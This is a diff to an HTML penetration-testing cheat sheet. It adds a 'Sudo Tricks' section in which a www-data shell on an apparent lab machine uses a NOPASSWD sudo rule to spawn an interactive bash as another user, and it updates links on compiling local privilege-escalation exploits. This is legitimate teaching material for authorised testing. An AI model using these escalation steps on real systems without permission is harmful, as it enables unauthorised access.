@@ -683,6 +683,25 @@ net start [SERVICE_NAME]
 <p><font size="3.5" color="black">- LinEnum - http://www.rebootuser.com/?p=1758</font></p>
 <p><font size="3.5" color="black">- LinuxPrivChecker - http://www.securitysift.com/download/linuxprivchecker.py</font></p>
 <br>
+<p><font size="3.5" color="black">Sudo Tricks:</font></p>
+<pre style="background-color:black;color:white;">
+#Great read - https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
+
+#Spawn a shell as a user
+www-data@bashed:/tmp$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+www-data@bashed:/tmp$ sudo -u scriptmanager bash -i
+sudo -u scriptmanager bash -i
+scriptmanager@bashed:/tmp$ whoami
+whoami
+scriptmanager
+</pre>
 <p><font size="3.5" color="black">What's the distribution type? What version?</font></p>
 <pre style="background-color:black;color:white;">
 cat /etc/issue
@@ -1071,9 +1090,10 @@ getsploit [VERSION]
 <p><font size="3.5" color="black">- http://www.securityfocus.com</font></p>
 <p><font size="3.5" color="black">- http://www.google.com</font></p>
 <hr>
-<p><h3>Cross-compilation</h3></p>
+<p><h3>Compilation</h3></p>
 <pre style="background-color:black;color:white;">
-Refer to - https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/
+Linux on Linux - https://null-byte.wonderhowto.com/how-to/perform-local-privilege-escalation-using-linux-kernel-exploit-0186317/
+Windows on Linux - https://null-byte.wonderhowto.com/how-to/use-mingw-compile-windows-exploits-kali-linux-0179461/
 </pre>
 <hr>
 <p><h3>AV evasion</h3></p>
